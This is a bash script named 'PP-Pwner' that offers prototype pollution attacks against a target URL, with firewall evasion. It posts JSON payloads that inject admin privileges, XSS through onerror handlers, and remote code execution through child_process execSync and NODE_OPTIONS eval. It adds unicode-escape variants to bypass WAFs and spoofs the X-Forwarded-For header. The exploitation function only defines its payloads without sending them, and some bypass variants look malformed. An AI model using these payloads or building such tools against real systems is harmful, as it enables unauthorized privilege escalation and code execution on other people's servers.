#!/bin/bash
# PP-Pwner: Advanced Prototype Pollution Tester with WAF Evasion
# Author: Reda Ouzidane (0xf14)
# Usage: ./pp-pwner.sh <TARGET_URL> [OPTIONS]

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Banner
echo -e "${YELLOW}"
cat << "EOF"
 ____  ____  ____  ____   __   _  _  ____  ____ 
(  _ \( ___)(  _ \(  _ \ /__\ ( \/ )(  _ \( ___)
 )___/ )__)  )   / )   //(__)\ \  /  )___/ )__) 
(__)  (____)(_)\_)(_)\_(__)(__)(__) (__)  (____)
EOF
echo -e "${NC}"
echo -e "${GREEN}Prototype Pollution Tester with WAF Bypass Techniques${NC}"
echo -e "${YELLOW}By Reda Ouzidane | Kali Linux Edition${NC}\n"

# Check dependencies
check_deps() {
    declare -A tools=(
        ["curl"]="sudo apt install curl"
        ["jq"]="sudo apt install jq"
        ["nikto"]="sudo apt install nikto"
        ["sqlmap"]="sudo apt install sqlmap"
        ["wfuzz"]="sudo apt install wfuzz"
    )

    for tool in "${!tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${RED}[!] Missing $tool - Installing...${NC}"
            eval "${tools[$tool]}"
        fi
    done
}

# WAF Detection
detect_waf() {
    echo -e "\n${YELLOW}[+] WAF Detection${NC}"
    waf_result=$(curl -sI "$1" | grep -iE 'cloudflare|akamai|imperva|barracuda')
    
    if [ -z "$waf_result" ]; then
        echo -e "${GREEN}[✓] No WAF detected${NC}"
    else
        echo -e "${RED}[!] WAF Detected:${NC} ${waf_result}"
        echo -e "${YELLOW}[*] Enabling WAF bypass techniques...${NC}"
    fi
}

# Payload Generator
generate_payloads() {
    echo -e "\n${YELLOW}[+] Generating Polymorphic Payloads${NC}"
    
    # Standard payloads
    payloads=(
        '{"__proto__":{"isAdmin":true}}'
        '{"constructor":{"prototype":{"polluted":true}}}'
        '{"a":1,"b":2,"__proto__":{"xss":"<img src=x onerror=alert(1)>"}}'
    )
    
    # WAF Bypass variations
    bypass_payloads=(
        '{"\u005f_proto__":{"isAdmin":true}}'                          # Unicode escape
        '{"constructor":{"prot\u000fotype":{"polluted":true}}}'        # Null byte injection
        '{"a":1,"b":2,"__pro__to__":{"xss":"javascript:alert(1)"}}'   # Obfuscation
        '{"a":1,"b":2,"__proto__":{"toString":"()=>require(\"child_process\").execSync(\"id\")"}}' # RCE
    )
    
    echo -e "${GREEN}[✓] Generated ${#payloads[@]} standard and ${#bypass_payloads[@]} WAF-bypass payloads${NC}"
}

# Test Endpoints
test_prototype_pollution() {
    target=$1
    echo -e "\n${YELLOW}[+] Testing for Prototype Pollution${NC}"
    
    for payload in "${payloads[@]}" "${bypass_payloads[@]}"; do
        echo -e "\n${YELLOW}[*] Trying payload:${NC} ${payload:0:50}..."
        
        response=$(curl -s -X POST "$target" \
            -H "Content-Type: application/json" \
            -H "X-Forwarded-For: 127.0.0.1" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" \
            -d "$payload")
        
        # Check if pollution was successful
        check_response=$(curl -s "$target")
        if echo "$check_response" | jq -e 'select(.isAdmin == true or .polluted == true)' &> /dev/null; then
            echo -e "${RED}[!] SUCCESSFUL POLLUTION!${NC}"
            echo -e "Payload: $payload"
            echo -e "Response: $check_response"
            return 0
        fi
    done
    
    echo -e "${GREEN}[✓] No prototype pollution vulnerabilities detected${NC}"
    return 1
}

# Advanced Exploitation
advanced_exploitation() {
    echo -e "\n${YELLOW}[+] Attempting Advanced Exploitation${NC}"
    
    # DOM XSS via Prototype Pollution
    echo -e "${YELLOW}[*] Testing for DOM XSS...${NC}"
    xss_payload='{"__proto__":{"innerHTML":"<img src=x onerror=alert(document.domain)>"}}'
    
    # RCE via Node.js
    echo -e "${YELLOW}[*] Testing for RCE...${NC}"
    rce_payload='{"__proto__":{"shell":"node","NODE_OPTIONS":"--eval=require(\"child_process\").execSync(\"whoami\")"}}'
    
    # Privilege Escalation
    echo -e "${YELLOW}[*] Testing for Privilege Escalation...${NC}"
    priv_esc_payload='{"__proto__":{"isAdmin":true,"roles":["admin"]}}'
}

# Main
if [ -z "$1" ]; then
    echo -e "${RED}[!] Usage: $0 <TARGET_URL> [OPTIONS]${NC}"
    echo -e "Options:"
    echo -e "  --deep    Perform deep scanning (slower)"
    echo -e "  --exploit Attempt exploitation if vulnerable"
    exit 1
fi

check_deps
detect_waf "$1"
generate_payloads
test_prototype_pollution "$1"

if [[ "$2" == "--exploit" ]]; then
    advanced_exploitation
fi

echo -e "\n${YELLOW}[+] Scan complete. Review results above.${NC}"
